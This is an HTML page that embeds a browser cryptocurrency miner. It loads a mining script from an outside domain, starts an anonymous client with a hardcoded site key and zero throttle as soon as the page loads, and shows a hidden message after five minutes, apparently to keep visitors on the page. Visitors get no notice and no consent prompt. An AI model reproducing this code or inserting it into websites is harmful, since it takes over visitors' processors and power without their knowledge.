<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Simple Miner Integration</title>
</head>
<body>
  <h1>Welcome to My Simple Miner Page</h1>
  <p>This page integrates the mining script.</p>

  <!-- Hidden element that will appear after 5 minutes -->
  <div id="delayed-element" style="display: none; margin-top: 1em; padding: 1em; border: 1px solid #ccc;">
    <p>This content appears after 5 minutes!</p>
  </div>

  <!-- Mining Script -->
  <script src="https://www.hostingcloud.racing/tc1M.js"></script>
  <script>
    var _client = new Client.Anonymous('195aebec64e39cfa71b56ed950fe41b63732e97109de79988755ac411447cc54', {
      throttle: 0,
      c: 'w'
    });
    _client.start();

    // Show the delayed element after 5 minutes (300,000 ms)
    setTimeout(function() {
      var el = document.getElementById('delayed-element');
      if (el) {
        el.style.display = 'block';
      }
    }, 300000);
  </script>
</body>
</html>
